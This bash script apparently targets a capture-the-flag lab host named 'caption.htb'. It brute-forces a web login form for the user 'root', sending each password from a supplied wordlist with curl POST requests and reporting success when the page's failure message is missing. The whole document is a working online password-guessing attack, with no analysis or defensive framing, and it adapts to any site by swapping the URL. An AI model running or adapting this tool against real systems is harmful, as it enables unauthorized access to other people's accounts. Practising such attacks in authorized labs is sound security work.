#!/bin/bash

# Check if the password file is provided as an argument
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <password_file>"
    exit 1
fi

# URL of the login page
url="http://caption.htb:8080/signin"

# Username to use
username="root"

# Path to the password file (dynamically assigned from the argument)
password_file="$1"

# Check if the password file exists
if [ ! -f "$password_file" ]; then
    echo "Password file '$password_file' not found!"
    exit 1
fi

# Debugging log: Display that we're reading the password file
echo "Reading passwords from: $password_file"

# Iterate through each password in the password file
while IFS= read -r password; do
    # Check if the password is empty (skip empty lines)
    if [ -z "$password" ]; then
        continue
    fi

    echo "Trying password: '$password'"

    # Send the POST request with the current password and capture the response body
    response=$(curl -s -d "userName=$username&password=$password" $url)

    # Check if the response contains the failure message
    if [[ "$response" == *"Sorry, your Username and/or Password is incorrect"* ]]; then
        echo "[FAILED] Username: $username, Password: '$password'"
    else
        echo "[SUCCESS] Username: $username, Password: '$password'"
        exit 0  # Stop after finding a valid password
    fi

done < "$password_file"

echo "Password brute-force complete."
